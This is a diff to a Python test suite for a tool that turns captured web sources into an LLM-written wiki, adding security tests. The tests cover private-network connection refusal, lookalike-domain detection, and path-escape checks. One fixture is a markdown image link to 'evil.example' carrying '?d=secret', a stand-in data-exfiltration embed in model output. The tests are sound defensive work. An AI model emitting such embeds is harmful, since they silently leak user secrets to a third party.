@@ -138,7 +138,10 @@ class WorkerEnrich(unittest.TestCase):
             w = s.Worker(vault, enrich=False, compile_cmd=fake_llm)
             w.submit(path, cap)
             w.jobs.join()
-            self.assertIn(path.relative_to(vault).as_posix(), (vault / "wiki" / "Page.md").read_text(encoding="utf-8"))
+            prompt = (vault / "wiki" / "Page.md").read_text(encoding="utf-8")
+            self.assertIn(path.relative_to(vault).as_posix(), prompt)
+            self.assertIn("https://example.com/post", prompt)  # source content is pasted in: no file tools needed
+            self.assertIn("LLM wiki", prompt)  # and so is the vault's CLAUDE.md schema
             for bad in (".obsidian/plugins/x/main.js", "raw/evil.md", "escape.md", "wiki/.hidden.md", "wiki/script.js"):
                 self.assertFalse((vault / bad).exists(), bad)
             self.assertIn("status: compiled", path.read_text(encoding="utf-8"))
@@ -151,10 +154,26 @@ class EnrichSafety(unittest.TestCase):
             self.assertFalse(s.is_public_url(url), url)
             self.assertEqual(s.fetch_meta(url), {}, url)
 
-    def test_redirect_into_lan_is_refused(self):
-        req = urllib.request.Request("https://example.com/")
-        hop = s.PublicOnlyRedirects().redirect_request(req, None, 302, "Found", {}, "http://192.168.0.1/")
-        self.assertIsNone(hop)
+    def test_connection_to_private_peer_is_refused(self):
+        """Even if DNS said "public" earlier (rebinding) or a redirect points inward, the socket check stops it."""
+        server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(Path("."), TOKEN, None))
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        try:
+            with self.assertRaises(OSError):
+                s.PUBLIC_ONLY_OPENER.open(f"http://127.0.0.1:{server.server_port}/health", timeout=5)
+        finally:
+            server.shutdown()
+            server.server_close()
+
+    def test_platform_detection_needs_the_real_domain(self):
+        self.assertEqual(s.detect_source("https://instagram.com.evil.example/reel/x"), "web")
+        self.assertEqual(s.detect_source("https://notx.com/a"), "web")
+        self.assertEqual(s.detect_source("https://m.youtube.com/watch?v=1"), "youtube")
+        self.assertEqual(s.detect_source("https://www.threads.net/@a/post/1"), "threads")
+
+    def test_remote_embeds_are_stripped_from_model_output(self):
+        md = 'ok ![x](https://evil.example/?d=secret) <img src="https://evil.example/a.png"> [link](https://a.b)'
+        self.assertEqual(s.strip_remote_embeds(md), "ok   [link](https://a.b)")
 
 
 if __name__ == "__main__":
